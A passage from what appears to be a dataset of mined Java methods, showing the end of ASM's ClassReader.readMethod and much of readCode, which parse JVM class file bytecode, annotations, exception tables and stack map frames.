fields.\n        currentAnnotationOffset = readTypeAnnotationTarget(context, currentAnnotationOffset);\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                methodVisitor.visitTypeAnnotation(\n                    context.currentTypeAnnotationTarget,\n                    context.currentTypeAnnotationTargetPath,\n                    annotationDescriptor,\n                    /* visible = */ true),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeInvisibleTypeAnnotations attribute.\n    if (runtimeInvisibleTypeAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeInvisibleTypeAnnotationsOffset);\n      int currentAnnotationOffset = runtimeInvisibleTypeAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the target_type, target_info and target_path fields.\n        currentAnnotationOffset = readTypeAnnotationTarget(context, currentAnnotationOffset);\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                methodVisitor.visitTypeAnnotation(\n                    context.currentTypeAnnotationTarget,\n                    context.currentTypeAnnotationTargetPath,\n                    annotationDescriptor,\n                    /* visible = */ false),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeVisibleParameterAnnotations attribute.\n    if (runtimeVisibleParameterAnnotationsOffset != 0) {\n      readParameterAnnotations(\n          methodVisitor, context, runtimeVisibleParameterAnnotationsOffset, /* visible = */ true);\n    }\n\n    // Visit the RuntimeInvisibleParameterAnnotations attribute.\n    if (runtimeInvisibleParameterAnnotationsOffset != 0) {\n      readParameterAnnotations(\n          methodVisitor,\n          context,\n          runtimeInvisibleParameterAnnotationsOffset,\n          /* visible = */ false);\n    }\n\n    // Visit the non standard attributes.\n    while (attributes != null) {\n      // Copy and reset the nextAttribute field so that it can also be used in MethodWriter.\n      Attribute nextAttribute = attributes.nextAttribute;\n      attributes.nextAttribute = null;\n      methodVisitor.visitAttribute(attributes);\n      attributes = nextAttribute;\n    }\n\n    // Visit the Code attribute.\n    if (codeOffset != 0) {\n      methodVisitor.visitCode();\n      readCode(methodVisitor, context, codeOffset);\n    }\n\n    // Visit the end of the method.\n    methodVisitor.visitEnd();\n    return currentOffset;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59269, "method_name": "readCode", "class_name": "ClassReader", "params": ["MethodVisitor", "Context", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void readCode(\n      final MethodVisitor methodVisitor, final Context context, final int codeOffset) {\n    int currentOffset = codeOffset;\n\n    // Read the max_stack, max_locals and code_length fields.\n    final byte[] classBuffer = classFileBuffer;\n    final char[] charBuffer = context.charBuffer;\n    final int maxStack = readUnsignedShort(currentOffset);\n    final int maxLocals = readUnsignedShort(currentOffset + 2);\n    final int codeLength = readInt(currentOffset + 4);\n    currentOffset += 8;\n\n    // Read the bytecode 'code' array to create a label for each referenced instruction.\n    final int bytecodeStartOffset = currentOffset;\n    final int bytecodeEndOffset = currentOffset + codeLength;\n    final Label[] labels = context.currentMethodLabels = new Label[codeLength + 1];\n    while (currentOffset < bytecodeEndOffset) {\n      final int bytecodeOffset = currentOffset - bytecodeStartOffset;\n      final int opcode = classBuffer[currentOffset] & 0xFF;\n      switch (opcode) {\n        case Opcodes.NOP:\n        case Opcodes.ACONST_NULL:\n        case Opcodes.ICONST_M1:\n        case Opcodes.ICONST_0:\n        case Opcodes.ICONST_1:\n        case Opcodes.ICONST_2:\n        case Opcodes.ICONST_3:\n        case Opcodes.ICONST_4:\n        case Opcodes.ICONST_5:\n        case Opcodes.LCONST_0:\n        case Opcodes.LCONST_1:\n        case Opcodes.FCONST_0:\n        case Opcodes.FCONST_1:\n        case Opcodes.FCONST_2:\n        case Opcodes.DCONST_0:\n        case Opcodes.DCONST_1:\n        case Opcodes.IALOAD:\n        case Opcodes.LALOAD:\n        case Opcodes.FALOAD:\n        case Opcodes.DALOAD:\n        case Opcodes.AALOAD:\n        case Opcodes.BALOAD:\n        case Opcodes.CALOAD:\n        case Opcodes.SALOAD:\n        case Opcodes.IASTORE:\n        case Opcodes.LASTORE:\n        case Opcodes.FASTORE:\n        case Opcodes.DASTORE:\n        case Opcodes.AASTORE:\n        case Opcodes.BASTORE:\n        case Opcodes.CASTORE:\n        case Opcodes.SASTORE:\n        case Opcodes.POP:\n        case Opcodes.POP2:\n        case Opcodes.DUP:\n        case Opcodes.DUP_X1:\n        case Opcodes.DUP_X2:\n        case Opcodes.DUP2:\n        case Opcodes.DUP2_X1:\n        case Opcodes.DUP2_X2:\n        case Opcodes.SWAP:\n        case Opcodes.IADD:\n        case Opcodes.LADD:\n        case Opcodes.FADD:\n        case Opcodes.DADD:\n        case Opcodes.ISUB:\n        case Opcodes.LSUB:\n        case Opcodes.FSUB:\n        case Opcodes.DSUB:\n        case Opcodes.IMUL:\n        case Opcodes.LMUL:\n        case Opcodes.FMUL:\n        case Opcodes.DMUL:\n        case Opcodes.IDIV:\n        case Opcodes.LDIV:\n        case Opcodes.FDIV:\n        case Opcodes.DDIV:\n        case Opcodes.IREM:\n        case Opcodes.LREM:\n        case Opcodes.FREM:\n        case Opcodes.DREM:\n        case Opcodes.INEG:\n        case Opcodes.LNEG:\n        case Opcodes.FNEG:\n        case Opcodes.DNEG:\n        case Opcodes.ISHL:\n        case Opcodes.LSHL:\n        case Opcodes.ISHR:\n        case Opcodes.LSHR:\n        case Opcodes.IUSHR:\n        case Opcodes.LUSHR:\n        case Opcodes.IAND:\n        case Opcodes.LAND:\n        case Opcodes.IOR:\n        case Opcodes.LOR:\n        case Opcodes.IXOR:\n        case Opcodes.LXOR:\n        case Opcodes.I2L:\n        case Opcodes.I2F:\n        case Opcodes.I2D:\n        case Opcodes.L2I:\n        case Opcodes.L2F:\n        case Opcodes.L2D:\n        case Opcodes.F2I:\n        case Opcodes.F2L:\n        case Opcodes.F2D:\n        case Opcodes.D2I:\n        case Opcodes.D2L:\n        case Opcodes.D2F:\n        case Opcodes.I2B:\n        case Opcodes.I2C:\n        case Opcodes.I2S:\n        case Opcodes.LCMP:\n        case Opcodes.FCMPL:\n        case Opcodes.FCMPG:\n        case Opcodes.DCMPL:\n        case Opcodes.DCMPG:\n        case Opcodes.IRETURN:\n        case Opcodes.LRETURN:\n        case Opcodes.FRETURN:\n        case Opcodes.DRETURN:\n        case Opcodes.ARETURN:\n        case Opcodes.RETURN:\n        case Opcodes.ARRAYLENGTH:\n        case Opcodes.ATHROW:\n        case Opcodes.MONITORENTER:\n        case Opcodes.MONITOREXIT:\n        case Constants.ILOAD_0:\n        case Constants.ILOAD_1:\n        case Constants.ILOAD_2:\n        case Constants.ILOAD_3:\n        case Constants.LLOAD_0:\n        case Constants.LLOAD_1:\n        case Constants.LLOAD_2:\n        case Constants.LLOAD_3:\n        case Constants.FLOAD_0:\n        case Constants.FLOAD_1:\n        case Constants.FLOAD_2:\n        case Constants.FLOAD_3:\n        case Constants.DLOAD_0:\n        case Constants.DLOAD_1:\n        case Constants.DLOAD_2:\n        case Constants.DLOAD_3:\n        case Constants.ALOAD_0:\n        case Constants.ALOAD_1:\n        case Constants.ALOAD_2:\n        case Constants.ALOAD_3:\n        case Constants.ISTORE_0:\n        case Constants.ISTORE_1:\n        case Constants.ISTORE_2:\n        case Constants.ISTORE_3:\n        case Constants.LSTORE_0:\n        case Constants.LSTORE_1:\n        case Constants.LSTORE_2:\n        case Constants.LSTORE_3:\n        case Constants.FSTORE_0:\n        case Constants.FSTORE_1:\n        case Constants.FSTORE_2:\n        case Constants.FSTORE_3:\n        case Constants.DSTORE_0:\n        case Constants.DSTORE_1:\n        case Constants.DSTORE_2:\n        case Constants.DSTORE_3:\n        case Constants.ASTORE_0:\n        case Constants.ASTORE_1:\n        case Constants.ASTORE_2:\n        case Constants.ASTORE_3:\n          currentOffset += 1;\n          break;\n        case Opcodes.IFEQ:\n        case Opcodes.IFNE:\n        case Opcodes.IFLT:\n        case Opcodes.IFGE:\n        case Opcodes.IFGT:\n        case Opcodes.IFLE:\n        case Opcodes.IF_ICMPEQ:\n        case Opcodes.IF_ICMPNE:\n        case Opcodes.IF_ICMPLT:\n        case Opcodes.IF_ICMPGE:\n        case Opcodes.IF_ICMPGT:\n        case Opcodes.IF_ICMPLE:\n        case Opcodes.IF_ACMPEQ:\n        case Opcodes.IF_ACMPNE:\n        case Opcodes.GOTO:\n        case Opcodes.JSR:\n        case Opcodes.IFNULL:\n        case Opcodes.IFNONNULL:\n          createLabel(bytecodeOffset + readShort(currentOffset + 1), labels);\n          currentOffset += 3;\n          break;\n        case Constants.ASM_IFEQ:\n        case Constants.ASM_IFNE:\n        case Constants.ASM_IFLT:\n        case Constants.ASM_IFGE:\n        case Constants.ASM_IFGT:\n        case Constants.ASM_IFLE:\n        case Constants.ASM_IF_ICMPEQ:\n        case Constants.ASM_IF_ICMPNE:\n        case Constants.ASM_IF_ICMPLT:\n        case Constants.ASM_IF_ICMPGE:\n        case Constants.ASM_IF_ICMPGT:\n        case Constants.ASM_IF_ICMPLE:\n        case Constants.ASM_IF_ACMPEQ:\n        case Constants.ASM_IF_ACMPNE:\n        case Constants.ASM_GOTO:\n        case Constants.ASM_JSR:\n        case Constants.ASM_IFNULL:\n        case Constants.ASM_IFNONNULL:\n          createLabel(bytecodeOffset + readUnsignedShort(currentOffset + 1), labels);\n          currentOffset += 3;\n          break;\n        case Constants.GOTO_W:\n        case Constants.JSR_W:\n        case Constants.ASM_GOTO_W:\n          createLabel(bytecodeOffset + readInt(currentOffset + 1), labels);\n          currentOffset += 5;\n          break;\n        case Constants.WIDE:\n          switch (classBuffer[currentOffset + 1] & 0xFF) {\n            case Opcodes.ILOAD:\n            case Opcodes.FLOAD:\n            case Opcodes.ALOAD:\n            case Opcodes.LLOAD:\n            case Opcodes.DLOAD:\n            case Opcodes.ISTORE:\n            case Opcodes.FSTORE:\n            case Opcodes.ASTORE:\n            case Opcodes.LSTORE:\n            case Opcodes.DSTORE:\n            case Opcodes.RET:\n              currentOffset += 4;\n              break;\n            case Opcodes.IINC:\n              currentOffset += 6;\n              break;\n            default:\n              throw new IllegalArgumentException();\n          }\n          break;\n        case Opcodes.TABLESWITCH:\n          // Skip 0 to 3 padding bytes.\n          currentOffset += 4 - (bytecodeOffset & 3);\n          // Read the default label and the number of table entries.\n          createLabel(bytecodeOffset + readInt(currentOffset), labels);\n          int numTableEntries = readInt(currentOffset + 8) - readInt(currentOffset + 4) + 1;\n          currentOffset += 12;\n          // Read the table labels.\n          while (numTableEntries-- > 0) {\n            createLabel(bytecodeOffset + readInt(currentOffset), labels);\n            currentOffset += 4;\n          }\n          break;\n        case Opcodes.LOOKUPSWITCH:\n          // Skip 0 to 3 padding bytes.\n          currentOffset += 4 - (bytecodeOffset & 3);\n          // Read the default label and the number of switch cases.\n          createLabel(bytecodeOffset + readInt(currentOffset), labels);\n          int numSwitchCases = readInt(currentOffset + 4);\n          currentOffset += 8;\n          // Read the switch labels.\n          while (numSwitchCases-- > 0) {\n            createLabel(bytecodeOffset + readInt(currentOffset + 4), labels);\n            currentOffset += 8;\n          }\n          break;\n        case Opcodes.ILOAD:\n        case Opcodes.LLOAD:\n        case Opcodes.FLOAD:\n        case Opcodes.DLOAD:\n        case Opcodes.ALOAD:\n        case Opcodes.ISTORE:\n        case Opcodes.LSTORE:\n        case Opcodes.FSTORE:\n        case Opcodes.DSTORE:\n        case Opcodes.ASTORE:\n        case Opcodes.RET:\n        case Opcodes.BIPUSH:\n        case Opcodes.NEWARRAY:\n        case Opcodes.LDC:\n          currentOffset += 2;\n          break;\n        case Opcodes.SIPUSH:\n        case Constants.LDC_W:\n        case Constants.LDC2_W:\n        case Opcodes.GETSTATIC:\n        case Opcodes.PUTSTATIC:\n        case Opcodes.GETFIELD:\n        case Opcodes.PUTFIELD:\n        case Opcodes.INVOKEVIRTUAL:\n        case Opcodes.INVOKESPECIAL:\n        case Opcodes.INVOKESTATIC:\n        case Opcodes.NEW:\n        case Opcodes.ANEWARRAY:\n        case Opcodes.CHECKCAST:\n        case Opcodes.INSTANCEOF:\n        case Opcodes.IINC:\n          currentOffset += 3;\n          break;\n        case Opcodes.INVOKEINTERFACE:\n        case Opcodes.INVOKEDYNAMIC:\n          currentOffset += 5;\n          break;\n        case Opcodes.MULTIANEWARRAY:\n          currentOffset += 4;\n          break;\n        default:\n          throw new IllegalArgumentException();\n      }\n    }\n\n    // Read the 'exception_table_length' and 'exception_table' field to create a label for each\n    // referenced instruction, and to make methodVisitor visit the corresponding try catch blocks.\n    int exceptionTableLength = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (exceptionTableLength-- > 0) {\n      Label start = createLabel(readUnsignedShort(currentOffset), labels);\n      Label end = createLabel(readUnsignedShort(currentOffset + 2), labels);\n      Label handler = createLabel(readUnsignedShort(currentOffset + 4), labels);\n      String catchType = readUTF8(cpInfoOffsets[readUnsignedShort(currentOffset + 6)], charBuffer);\n      currentOffset += 8;\n      methodVisitor.visitTryCatchBlock(start, end, handler, catchType);\n    }\n\n    // Read the Code attributes to create a label for each referenced instruction (the variables\n    // are ordered as in Section 4.7 of the JVMS). Attribute offsets exclude the\n    // attribute_name_index and attribute_length fields.\n    // - The offset of the current 'stack_map_frame' in the StackMap[Table] attribute, or 0.\n    // Initially, this is the offset of the first 'stack_map_frame' entry. Then this offset is\n    // updated after each stack_map_frame is read.\n    int stackMapFrameOffset = 0;\n    // - The end offset of the StackMap[Table] attribute, or 0.\n    int stackMapTableEndOffset = 0;\n    // - Whether the stack map frames are compressed (i.e. in a StackMapTable) or not.\n    boolean compressedFrames = true;\n    // - The offset of the LocalVariableTable attribute, or 0.\n    int localVariableTableOffset = 0;\n    // - The offset of the LocalVariableTypeTable attribute, or 0.\n    int localVariableTypeTableOffset = 0;\n    // - The offset of each 'type_annotation' entry in the RuntimeVisibleTypeAnnotations\n    // attribute, or null.\n    int[] visibleTypeAnnotationOffsets = null;\n    // - The offset of each 'type_annotation' entry in the RuntimeInvisibleTypeAnnotations\n    // attribute, or null.\n    int[] invisibleTypeAnnotationOffsets = null;\n    // - The non standard attributes (linked with their {@link Attribute#nextAttribute} field).\n    //   This list in the <i>reverse order</i> or their order in the ClassFile structure.\n    Attribute attributes = null;\n\n    int attributesCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (attributesCount-- > 0) {\n      // Read the attribute_info's attribute_name and attribute_length fields.\n      String attributeName = readUTF8(currentOffset, charBuffer);\n      int attributeLength = readInt(currentOffset + 2);\n      currentOffset += 6;\n      if (Constants.LOCAL_VARIABLE_TABLE.equals(attributeName)) {\n        if ((context.parsingOptions & SKIP_DEBUG) == 0) {\n          localVariableTableOffset = currentOffset;\n          // Parse the attribute to find the corresponding (debug only) labels.\n          int currentLocalVariableTableOffset = currentOffset;\n          int localVariableTableLength = readUnsignedShort(currentLocalVariableTableOffset);\n          currentLocalVariableTableOffset += 2;\n          while (localVariableTableLength-- > 0) {\n            int startPc = readUnsignedShort(currentLocalVariableTableOffset);\n            createDebugLabel(startPc, labels);\n            int length = readUnsignedShort(currentLocalVariableTableOffset + 2);\n            createDebugLabel(startPc + length, labels);\n            // Skip the name_index, descriptor_index and index fields (2 bytes each).\n            currentLocalVariableTableOffset += 10;\n          }\n        }\n      } else if (Constants.LOCAL_VARIABLE_TYPE_TABLE.equals(attributeName)) {\n        localVariableTypeTableOffset = currentOffset;\n        // Here we do not extract the labels corresponding to the attribute content. We assume they\n        // are the same or a subset of those of the LocalVariableTable attribute.\n      } else if (Constants.LINE_NUMBER_TABLE.equals(attributeName)) {\n        if ((context.parsingOptions & SKIP_DEBUG) == 0) {\n          // Parse the attribute to find the corresponding (debug only) labels.\n          int currentLineNumberTableOffset = currentOffset;\n          int lineNumberTableLength = readUnsignedShort(currentLineNumberTableOffset);\n          currentLineNumberTableOffset += 2;\n          while (lineNumberTableLength-- > 0) {\n            int startPc = readUnsignedShort(currentLineNumberTableOffset);\n            int lineNumber = readUnsignedShort(currentLineNumberTableOffset + 2);\n            currentLineNumberTableOffset += 4;\n            createDebugLabel(startPc, labels);\n            labels[startPc].addLineNumber(lineNumber);\n          }\n        }\n      } else if (Constants.RUNTIME_VISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        visibleTypeAnnotationOffsets =\n            readTypeAnnotations(methodVisitor, context, currentOffset, /* visible = */ true);\n        // Here we do not extract the labels corresponding to the attribute content. This would\n        // require a full parsing of the attribute, which would need to be repeated when parsing\n        // the bytecode instructions (see below). Instead, the content of the attribute is read one\n        // type annotation at a time (i.e. after a type annotation has been visited, the next type\n        // annotation is read), and the labels it contains are also extracted one annotation at a\n        // time. This assumes that type annotations are ordered by increasing bytecode offset.\n      } else if (Constants.RUNTIME_INVISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        invisibleTypeAnnotationOffsets =\n            readTypeAnnotations(methodVisitor, context, currentOffset, /* visible = */ false);\n        // Same comment as above for the RuntimeVisibleTypeAnnotations attribute.\n      } else if (Constants.STACK_MAP_TABLE.equals(attributeName)) {\n        if ((context.parsingOptions & SKIP_FRAMES) == 0) {\n          stackMapFrameOffset = currentOffset + 2;\n          stackMapTableEndOffset = currentOffset + attributeLength;\n        }\n        // Here we do not extract the labels corresponding to the attribute content. This would\n        // require a full parsing of the attribute, which would need to be repeated when parsing\n        // the bytecode instructions (see below). Instead, the content of the attribute is read one\n        // frame at a time (i.e. after a frame has been visited, the next frame is read), and the\n        // labels it contains are also extracted one frame at a time. Thanks to the ordering of\n        // frames, having only a \"one frame lookahead\" is not a problem, i.e. it is not possible to\n        // see an offset smaller than the offset of the current instruction and for which no Label\n        // exist. Except for UNINITIALIZED type offsets. We solve this by parsing the stack map\n        // table without a full decoding (see below).\n      } else if (\"StackMap\".equals(attributeName)) {\n        if ((context.parsingOptions & SKIP_FRAMES) == 0) {\n          stackMapFrameOffset = currentOffset + 2;\n          stackMapTableEndOffset = currentOffset + attributeLength;\n          compressedFrames = false;\n        }\n        // IMPORTANT! Here we assume that the frames are ordered, as in the StackMapTable attribute,\n        // although this is not guaranteed by the attribute format. This allows an incremental\n        // extraction of the labels corresponding to this attribute (see the comment above for the\n        // StackMapTable attribute).\n      } else {\n        Attribute attribute =\n            readAttribute(\n                context.attributePrototypes,\n                attributeName,\n                currentOffset,\n                attributeLength,\n                charBuffer,\n                codeOffset,\n                labels);\n        attribute.nextAttribute = attributes;\n        attributes = attribute;\n      }\n      currentOffset += attributeLength;\n    }\n\n    // Initialize the context fields related to stack map frames, and generate the first\n    // (implicit) stack map frame, if needed.\n    final boolean expandFrames = (context.parsingOptions & EXPAND_FRAMES) != 0;\n    if (stackMapFrameOffset != 0) {\n      // The bytecode offset of the first explicit frame is not offset_delta + 1 but only\n      // offset_delta. Setting the implicit frame offset to -1 allows us to use of the\n      // \"offset_delta + 1\" rule in all cases.\n      context.currentFrameOffset = -1;\n      context.currentFrameType = 0;\n      context.currentFrameLocalCount = 0;\n      context.currentFrameLocalCountDelta = 0;\n      context.currentFrameLocalTypes = new Object[maxLocals];\n      context.currentFrameStackCount = 0;\n      context.currentFrameStackTypes = new Object[maxStack];\n      if (expandFrames) {\n        computeImplicitFrame(context);\n      }\n      // Find the labels for UNINITIALIZED frame types. Instead of decoding each element of the\n      // stack map table, we look for 3 consecutive bytes that \"look like\" an UNINITIALIZED type\n      // (tag ITEM_Uninitialized, offset within bytecode bounds, NEW instruction at this offset).\n      // We may find false positives (i.e. not real UNINITIALIZED types), but this should be rare,\n      // and the only consequence will be the creation of an unneeded label. This is better than\n      // creating a label for each NEW instruction, and faster than fully decoding the whole stack\n      // map table.\n      for (int offset = stackMapFrameOffset; offset < stackMapTableEndOffset - 2; ++offset) {\n        if (classBuffer[offset] == Frame.ITEM_UNINITIALIZED) {\n          int potentialBytecodeOffset = readUnsignedShort(offset + 1);\n          if (potentialBytecodeOffset >= 0\n              && potentialBytecodeOffset < codeLength\n              && (classBuffer[bytecodeStartOffset + potentialBytecodeOffset] & 0xFF)\n                  == Opcodes.NEW) {\n            createLabel(potentialBytecodeOffset, labels);\n          }\n        }\n      }\n    }\n    if (expandFrames && (context.parsingOptions & EXPAND_ASM_INSNS) != 0) {\n      // Expanding the ASM specific instructions can introduce F_INSERT frames, even if the method\n      // does not currently have any frame. These inserted frames must be computed by simulating the\n      // effect of the bytecode instructions, one by one, starting from the implicit first frame.\n      // For this, MethodWriter needs to know maxLocals before the first instruction is visited. To\n      // ensure this, we visit the implicit first frame here (passing only maxLocals - the rest is\n      // computed in MethodWriter).\n      methodVisitor.visitFrame(Opcodes.F_NEW, maxLocals, null, 0, null);\n    }\n\n    // Visit the bytecode instructions. First, introduce state variables for the incremental parsing\n    // of the type annotations.\n\n    // Index of the next runtime visible type annotation to read (in the\n    // visibleTypeAnnotationOffsets array).\n    int currentVisibleTypeAnnotationIndex = 0;\n    // The bytecode offset of the next runtime visible type annotation to read, or -1.\n    int currentVisibleTypeAnnotationBytecodeOffset =\n        getTypeAnnotationBytecodeOffset(visibleTypeAnnotationOffsets, 0);\n    // Index of the next runtime invisible type annotation to read (in the\n    // invisibleTypeAnnotationOffsets array).\n    int currentInvisibleTypeAnnotationIndex = 0;\n    // The bytecode offset of the next runtime invisible type annotation to read, or -1.\n    int currentInvisibleTypeAnnotationBytecodeOffset =\n        getTypeAnnotationBytecodeOffset(invisibleTypeAnnotationOffsets, 0);\n\n    // Whether a F_INSERT stack map frame must be inserted before the current instruction.\n    boolean insertFrame = false;\n\n    // The delta to subtract from a goto_w or jsr_w opcode to get the corresponding goto or jsr\n    // opcode, or 0 if goto_w and jsr_w must be left unchanged (i.e. when expanding ASM specific\n    // instructions).\n    final int wideJumpOpcodeDelta =\n        (context.parsingOptions & EXPAND_ASM_INSNS) == 0 ? Constants.WIDE_JUMP_OPCODE_DELTA : 0;\n\n    currentOffset = bytecodeStartOffset;\n    while (currentOffset < bytecodeEndOffset) {\n      final int currentBytecodeOffset = currentOffset - bytecodeStartOffset;\n\n      // Visit the label and the line number(s) for this bytecode offset, if any.\n      Label currentLabel = labels[currentBytecodeOffset];\n      if (currentLabel != null) {\n        currentLabel.accept(methodVisitor, (context.parsingOptions & SKIP_DEBUG) == 0);\n      }\n\n      // Visit the stack map frame for this bytecode offset, if any.\n      while (stackMapFrameOffset != 0\n          && (context.currentFrameOffset == currentBytecodeOffset\n              || context.currentFrameOffset == -1)) {\n        // If there is a stack map frame for this offset, make methodVisitor visit it, and read the\n        // next stack map frame if there is one.\n        if (context.currentFrameOffset != -1) {\n          if (!compressedFrames || expandFrames) {\n            methodVisitor.visitFrame(\n                Opcodes.F_NEW,\n                context.currentFrameLocalCount,\n                context.currentFrameLocalTypes,\n                context.currentFrameStackCount,\n                context.currentFrameStackTypes);\n          } else {\n            methodVisitor.visitFrame(\n                context.currentFrameType,\n                context.currentFrameLocalCountDelta,\n                context.currentFrameLocalTypes,\n                context.currentFrameStackCount,\n                context.currentFrameStackTypes);\n          }\n          // Since there is already a stack map frame for this bytecode offset, there is no need to\n          // insert a new one.\n          insertFrame = false;\n        }\n        if (stackMapFrameOffset < stackMapTableEndOffset) {\n          stackMapFrameOffset =\n              readStackMapFrame(stackMapFrameOffset, compressedFrames, expandFrames, context);\n        } else {\n          stackMapFrameOffset = 0;\n        }\n      }\n\n      // Insert a stack map frame for this bytecode offset, if requested by setting insertFrame to\n      // true during the previous iteration. The actual frame content is computed in MethodWriter.\n      if (insertFrame) {\n        if ((context.parsingOptions & EXPAND_FRAMES) != 0) {\n          methodVisitor.visitFrame(Constants.F_INSERT, 0, null, 0, null);\n        }\n        insertFrame = false;\n      }\n\n      // Visit the instruction at this bytecode offset.\n      int opcode = classBuffer[currentOffset] & 0xFF;\n      switch (opcode) {\n        case Opcodes.NOP:\n        case Opcodes.ACONST_NULL:\n        case Opcodes.ICONST_M1:\n        case Opcodes.ICONST_0:\n        case Opcodes.ICONST_1:\n        case Opcodes.ICONST_2:\n        case Opcodes.ICONST_3:\n        case Opcodes.ICONST_4:\n        case Opcodes.ICONST_5:\n        case Opcodes.LCONST_0:\n        case Opcodes.LCONST_1:\n        case Opcodes.FCONST_0:\n        case Opcodes.FCONST_1:\n        case Opcodes.FCONST_2:\n        case Opcodes.DCONST_0:\n        case Opcodes.DCONST_1:\n        case Opcodes.IALOAD:\n        case Opcodes.LALOAD:\n        case Opcodes.FALOAD:\n        case Opcodes.DALOAD:\n        case Opcodes.AALOAD:\n        case Opcodes.BALOAD:\n        case Opcodes.CALOAD:\n        case Opcodes.SALOAD:\n        case Opcodes.IASTORE:\n        case Opcodes.LASTORE:\n        case Opcodes.FASTORE:\n        case Opcodes.DASTORE:\n        case Opcodes.AASTORE:\n        case Opcodes.BASTORE:\n        case Opcodes.CASTORE:\n        case Opcodes.SASTORE:\n        case Opcodes.POP:\n        case Opcodes.POP2:\n        case Opcodes.DUP:\n        case Opcodes.DUP_X1:\n        case Opcodes.DUP_X2:\n        case Opcodes.DUP2:\n        case Opcodes.DUP2_X1:\n        case Opcodes.DUP2_X2:\n        case Opcodes.SWAP:\n        case Opcodes.IADD:\n        case Opcodes.LADD:\n        case Opcodes.FADD:\n        case Opcodes.DADD:\n        case Opcodes.ISUB:\n        case Opcodes.LSUB:\n        case Opcodes.FSUB:\n        case Opcodes.DSUB:\n        case Opcodes.IMUL:\n        case Opcodes.LMUL:\n        case Opcodes.FMUL:\n        case Opcodes.DMUL:\n        case Opcodes.IDIV:\n        case Opcodes.LDIV:\n        case Opcodes.FDIV:\n        case Opcodes.DDIV:\n        case Opcodes.IREM:\n        case Opcodes.LREM:\n        case Opcodes.FREM:\n        case Opcodes.DREM:\n        case Opcodes.INEG:\n        case Opcodes.LNEG:\n        case Opcodes.FNEG:\n        case Opcodes.DNEG:\n        case Opcodes.ISHL:\n        case Opcodes.LSHL:\n        case Opcodes.ISHR:\n        case Opcodes.LSHR:\n        case Opcodes.IUSHR:\n        case Opcodes.LUSHR:\n        case Opcodes.IAND:\n        case Opcodes.LAND:\n        case Opcodes.IOR:\n        case Opcodes.LOR:\n        case Opcodes.IXOR:\n        case Opcodes.LXOR:\n        case Opcodes.I2L:\n        case Opcodes.I2F:\n        case Opcodes.I2D:\n        case Opcodes.L2I:\n        case Opcodes.L2F:\n        case Opcodes.L2D:\n        case Opcodes.F2I:\n        case Opcodes.F2L:\n        case Opcodes.F2D:\n        case Opcodes.D2I:\n        case Opcodes.D2L:\n        case Opcodes.D2F:\n        case Opcodes.I2B:\n        case Opcodes.I2C:\n        case Opcodes.I2S:\n        case Opcodes.LCMP:\n        case Opcodes.FCMPL:\n        case Opcodes.FCMPG:\n        case Opcodes.DCMPL:\n        case Opcodes.DCMPG:\n        case Opcodes.IRETURN:\n        case Opcodes.LRETURN:\n        case Opcodes.FRETURN:\n        case Opcodes.DRETURN:\n        case Opcodes.ARETURN:\n        case Opcodes.RETURN:\n        case Opcodes.ARRAYLENGTH:\n        case Opcodes.ATHROW:\n        case Opcodes.MONITORENTER:\n        case Opcodes.MONITOREXIT:\n          methodVisitor.visitInsn(opcode);\n          currentOffset += 1;\n          break;\n        case Constants.ILOAD_0:\n        case Constants.ILOAD_1:\n        case Constants.ILOAD_2:\n        case Constants.ILOAD_3:\n        case Constants.LLOAD_0:\n        case Constants.LLOAD_1:\n        case Constants.LLOAD_2:\n        case Constants.LLOAD_3:\n        case Constants.FLOAD_0:\n        case Constants.FLOAD_1:\n        case Constants.FLOAD_2:\n        case Constants.FLOAD_3:\n        case Constants.DLOAD_0:\n        case Constants.DLOAD_1:\n        case Constants.DLOAD_2:\n        case Constants.DLOAD_3:\n        case Constants.ALOAD_0:\n        case Constants.ALOAD_1:\n        case Constants.ALOAD_2:\n        case Constants.ALOAD_3:\n          opcode -= Constants.ILOAD_0;\n          methodVisitor.visitVarInsn(Opcodes.ILOAD + (opcode >> 2), opcode & 0x3);\n          currentOffset += 1;\n          break;\n        case Constants.ISTORE_0:\n        case Constants.ISTORE_1:\n        case Constants.ISTORE_2:\n        case Constants.ISTORE_3:\n        case Constants.LSTORE_0:\n        case Constants.LSTORE_1:\n        case Constants.LSTORE_2:\n        case Constants.LSTORE_3:\n        case Constants.FSTORE_0:\n        case Constants.FSTORE_1:\n        case Constants.FSTORE_2:\n        case Constants.FSTORE_3:\n        case Constants.DSTORE_0:\n        case Constants.DSTORE_1:\n        case Constants.DSTORE_2:\n        case Constants.DSTORE_3:\n        case Constants.ASTORE_0:\n        case Constants.ASTORE_1:\n        case Constants.ASTORE_2:\n        case Constants.ASTORE_3:\n          opcode -= Constants.ISTORE_0;\n          methodVisitor.visitVarInsn(Opcodes.ISTORE + (opcode >> 2), opcode & 0x3);\n          currentOffset += 1;\n          break;\n        case Opcodes.IFEQ:\n        case Opcodes.IFNE:\n        case Opcodes.IFLT:\n        case Opcodes.IFGE:\n        case Opcodes.IFGT:\n        case Opcodes.IFLE:\n        case Opcodes.IF_ICMPEQ:\n        case Opcodes.IF_ICMPNE:\n        case Opcodes.IF_ICMPLT:\n        case Opcodes.IF_ICMPGE:\n        case Opcodes.IF_ICMPGT:\n        case Opcodes.IF_ICMPLE:\n        case Opcodes.IF_ACMPEQ:\n        case Opcodes.IF_ACMPNE:\n        case 